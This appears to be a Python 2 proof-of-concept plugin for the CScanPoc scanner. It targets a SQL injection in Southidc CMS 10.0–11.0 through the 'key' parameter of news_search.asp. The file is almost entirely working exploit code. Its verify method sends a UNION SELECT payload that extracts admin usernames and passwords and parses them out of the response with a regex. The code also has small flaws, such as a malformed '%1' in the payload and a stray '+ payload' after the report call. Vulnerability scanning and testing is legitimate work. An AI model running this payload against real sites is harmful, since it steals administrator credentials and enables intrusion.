# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Southidc_0101'  # 平台漏洞编号，留空
    name = 'Southidc(南方数据)/11.0 /news_search.asp SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-27'  # 漏洞公布时间
    desc = '''
    Southidc v10.0到v11.0版本中news_search.asp文件对key参数没有适当过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-62399'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Southidc'  # 漏洞应用名称
    product_version = '11.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6a9f7762-ed0c-4d01-a08d-bca97db2f7e8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/news_search.asp?'
            payload = ("key=7'%20Union%20select%200,username%2bchr(124)%2bpassword,"
                       "2,3,4,5,6,7,8,9%20from%20admin%20where%1%20or%20''='&otype=title&Submit=%CB%D1%CB%F7")
            req = urllib2.Request(verify_url + payload)
            res = urllib2.urlopen(req)
            content = res.read()
            if res.code == 200:
                pattern = re.compile(
                    r'.*?\\">(?P<username>[a-zA-Z0-9]+)\\|(?P<password>[a-zA-Z0-9]+)', re.I | re.S)
                match = pattern.match(content)
                if match:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name)) + payload

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
